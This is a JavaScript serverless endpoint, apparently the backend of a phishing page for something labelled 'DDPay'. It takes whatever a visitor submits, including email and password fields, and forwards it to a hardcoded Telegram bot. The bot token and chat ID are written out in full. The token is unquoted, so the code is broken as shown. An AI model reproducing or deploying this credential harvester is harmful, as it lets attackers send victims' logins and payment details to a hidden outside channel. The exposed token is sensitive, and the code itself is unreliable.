export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { text, email, password, data } = req.body;
  // Jo bhi user type karega wo isme aayega
  const messageToSend = text || email || password || JSON.stringify(data) || JSON.stringify(req.body);

  const BOT_TOKEN = 8906721992:AAEW-VcvfCCO5m_R1K4iH6UOvKl--lpDrJM
  const CHAT_ID = 7344589159

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: `DDPay New Entry:\n\n${messageToSend}`
      })
    });

    return res.status(200).json({ success: true });
  } catch (error) {
    return res.status(500).json({ error: 'Failed' });
  }
}
